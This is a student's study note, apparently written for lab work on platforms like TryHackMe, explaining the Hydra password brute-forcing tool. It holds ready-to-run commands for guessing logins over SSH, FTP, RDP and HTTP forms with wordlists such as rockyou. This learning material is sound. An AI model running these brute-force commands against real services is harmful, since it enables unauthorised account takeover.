# Hydra
**Path:** CyberSec_101 - Offensive Security Tooling
**Date:** 2026-03-15
**Difficulty:** Easy

---

## What is Hydra

- Fast online password brute forcing tool
- Supports many protocols: SSH, FTP, HTTP, HTTPS,
  SMB, RDP, Telnet, MySQL and more
- Pre-installed on Kali Linux

---

## Commands Used
```bash
# Brute force SSH
hydra -l username -P /path/to/wordlist.txt ssh://10.10.x.x

# Brute force SSH with unknown username too
hydra -L users.txt -P passwords.txt ssh://10.10.x.x

# Brute force HTTP POST login form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
10.10.x.x http-post-form \
"/login:username=^USER^&password=^PASS^:F=incorrect"

# Brute force FTP
hydra -l admin -P rockyou.txt ftp://10.10.x.x

# Brute force RDP
hydra -l admin -P rockyou.txt rdp://10.10.x.x

# Useful flags
-l → single username
-L → username wordlist
-p → single password
-P → password wordlist
-t 4 → number of threads (default 16)
-v → verbose output
-V → show every attempt
-s → custom port e.g. -s 2222
```

---

## HTTP POST Form Syntax Explained
```
"/login:username=^USER^&password=^PASS^:F=incorrect"
   |              |              |         |
  path      user field    pass field   fail string
```

- `^USER^` → Hydra replaces this with each username
- `^PASS^` → Hydra replaces this with each password
- `F=incorrect` → F means failure string, what the
  page shows on wrong password
- `S=welcome` → S means success string (alternative)

---

## Common Wordlists on Kali
```bash
/usr/share/wordlists/rockyou.txt        # most used
/usr/share/wordlists/dirbuster/         # directory lists
/usr/share/seclists/Passwords/          # various password lists
```

Unzip rockyou first if needed:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## Gotchas / Surprises

- Always identify the fail string correctly before running
  wrong fail string = Hydra reports everything as success
- Use -t 4 on THM machines — too many threads can crash target
- For HTTP forms inspect the login request in Burp first
  to get exact field names and form action path
- SSH brute force is slow — use small targeted wordlists

---

## My Understanding in Plain English

Hydra automates password guessing by trying every
password in a wordlist against a login service.
You give it the target, protocol, username and wordlist
and it hammers the login until it finds the right password
or exhausts the list.
Hydra is online password cracking tool which interact with live services over a network to try and log in where as John is offline password cracker it works on files you have already on you machine

---

## Related Notes

- [[Burp Suite Basics]]
- [[Web Application Basics]]
- [[Offensive Security Tooling]]
